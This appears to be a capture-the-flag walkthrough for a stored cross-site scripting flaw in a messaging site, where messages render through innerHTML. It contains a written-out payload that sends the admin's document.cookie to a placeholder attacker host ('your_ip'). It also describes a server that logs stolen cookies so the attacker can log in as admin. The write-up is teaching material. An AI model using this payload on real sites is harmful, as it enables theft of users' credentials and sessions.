## Walkthrough
Sites that allow users to send each other messages are sometimes vulnerable to cross site scripting attacks. These attacks inject a script into a victim's browser using a message. This script often forces the victim's browser to navigate to a malicious website or to send the victim's personal information to the attacker.

One of the signs that this site is vulnerable to a xss attack is by looking at how it displays messages. By checking the "View Messages" page, you can see that it calls the populateMessages function in message.js after loading. The populateMessages function uses an ajax GET request with the user's username and password (from cookies). When the result is a 201, it adds the messages' subjects to the sidebar. Clicking the subject will cause the message to load in the main part of the screen. You can tell that this is vulnerable to a xss attack because it uses ".innerHTML = " to display the messages. This method simply inserts the message between the tags of an element, and there are no checks for if the message is HTML that will execute. For example, an element "&lt;p>&lt;/p>" that calls "el.innerHTML = '&lt;img src="http://www.vanderbilt.edu/asset/i/facebook-vanderbilt.jpg" onload="alert(1)" />'" will show an alert with the message "1".

Since you are able to message the admin, you can send them a message "'&lt;img src="http://www.vanderbilt.edu/asset/i/facebook-vanderbilt.jpg" onload=window.location="http://your_ip?cookie=" + document.cookie />'". When the admin opens the message, their browser will be directed to the site that you specified. You will have already set up this site to save the cookie parameter of the query of any requests that it receives. One example is to set up a very simple Node.js server (like this one) that has a GET on "/" and will save the "cookie" query parameter to a file. Since you have the admin's cookie, you have the admin's username and password since we already know that the username and password must be in the cookies from the populateMessages function. You are able to login as the admin and view the flag.
